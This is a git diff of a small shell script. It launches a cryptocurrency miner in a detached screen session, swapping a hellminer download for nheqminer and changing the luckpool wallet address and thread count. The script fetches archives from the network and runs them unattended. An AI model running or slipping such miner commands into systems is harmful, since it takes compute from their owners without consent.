@@ -6,4 +6,4 @@ mkdir yoho
 cd yoho
 
 screen -S "layar" -d -m
-screen -r "layar" -X stuff $'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW -p x --cpu 2\n'
+screen -r "layar" -X stuff $'wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l stratum+tcp://na.luckpool.net:3956 -u D5MGKpXzWKB49xbVk6nt4q4gi7bjJvxdUT.nhq -p c=DOGE,mc=VRSC -t 8\n'
